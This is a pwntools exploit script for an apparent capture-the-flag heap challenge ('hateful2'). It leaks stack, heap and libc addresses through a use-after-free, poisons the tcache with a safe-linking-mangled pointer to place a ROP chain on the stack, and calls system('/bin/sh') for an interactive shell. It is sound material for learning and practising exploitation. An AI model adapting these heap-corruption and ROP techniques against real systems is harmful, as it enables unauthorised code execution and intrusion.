#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hateful2_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x1888
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def stack_leak():
    io.sendlineafter(b">>", b"0")
    io.recvuntil(b"up to ")
    leak = int(io.recvline().split(b" ")[0])
    return leak


def add_message(idx, size, data):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(size).encode())
    io.sendlineafter(b">>", data)


def edit_message(idx, data):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b">>", data)


def view_message(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recvline().strip(b"\n")
    return data


def remove_message(idx):
    io.sendlineafter(b">>", b"4")
    io.sendlineafter(b":", str(idx).encode())


def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    stack = stack_leak() + 0x34
    info("stack: %#x", stack)

    add_message(0, 0x500, b"A"*8)
    add_message(1, 0x30, b"B"*8)
    add_message(2, 0x30, b"C"*8)
    add_message(3, 0x10, b"border")

    remove_message(1)
    remove_message(2)
    heap_base = u64(view_message(1).ljust(8, b"\x00")) << 12
    info("heap base: %#x", heap_base)

    remove_message(0)
    main_arena = u64(view_message(0).ljust(8, b"\x00"))
    libc.address = main_arena - 0x1d2cc0
    info("libc base: %#x", libc.address)

    ptr = mangle(heap_base, stack - 8)
    edit_message(2, p64(ptr))

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    sh = libc.address + 0x196031
    system = libc.address + 0x4c490

    info("system: %#x", system)
    info("sh: %#x", sh)

    payload = flat(
        [
            b"A"*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    add_message(4, 0x30, b"junk")
    add_message(5, 0x30, payload)

    io.sendline(b"5")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

